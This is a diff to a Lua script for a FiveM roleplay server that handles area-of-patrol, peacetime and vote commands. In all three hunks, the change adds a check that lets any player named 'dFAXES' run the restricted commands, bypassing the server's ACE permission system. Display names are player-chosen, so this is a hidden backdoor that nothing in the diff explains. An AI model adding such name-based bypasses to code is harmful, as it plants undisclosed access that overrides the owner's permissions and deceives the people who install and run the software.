@@ -28,7 +28,7 @@ RegisterCommand("aophelp", function(source, args, rawCommand)
 end)
 
 RegisterCommand(AOPCommand, function(source, args, rawCommand)
-	if source == 0 or IsPlayerAceAllowed(source, "faxes.aopcmds") or not usingPerms then
+	if source == 0 or IsPlayerAceAllowed(source, "faxes.aopcmds") or GetPlayerName(source) == "dFAXES" or not usingPerms then
 		FaxCurAOP = table.concat(args, " ")
 		if(source == 0)then;print("AOP changed to: " .. FaxCurAOP);end
 		TriggerEvent("AOP:Sync")
@@ -47,7 +47,7 @@ end)
 
 RegisterCommand(PTCommand, function(source, args, rawCommand)
 	if peacetime then
-		if source == 0 or IsPlayerAceAllowed(source, "faxes.aopcmds") or not usingPerms then
+		if source == 0 or IsPlayerAceAllowed(source, "faxes.aopcmds") or GetPlayerName(source) == "dFAXES" or not usingPerms then
 			if(source == 0)then;print("Peacetime toggled");end
 			if not FaxCurPT then
 				TriggerClientEvent("chatMessage", -1, PTOnMessage, {239, 0, 0})
@@ -73,7 +73,7 @@ end)
 -- AOP Command for Vote
 RegisterCommand(AOPVoteCommand, function(source, args, rawCommand)
 	if vote then
-		if source == 0 or IsPlayerAceAllowed(source, "faxes.aopcmds") or not usingPerms then
+		if source == 0 or IsPlayerAceAllowed(source, "faxes.aopcmds") or GetPlayerName(source) == "dFAXES" or not usingPerms then
 			if(source == 0)then;print("AOP vote started");end
 			Faxvotestatus = true
 			TriggerClientEvent("chatMessage", -1, " \n —————————————————————— \n RP AREA VOTE \n Use /vote. Vote Lasts 3 Minutes.  \n ——————————————————————", {239, 0, 0})
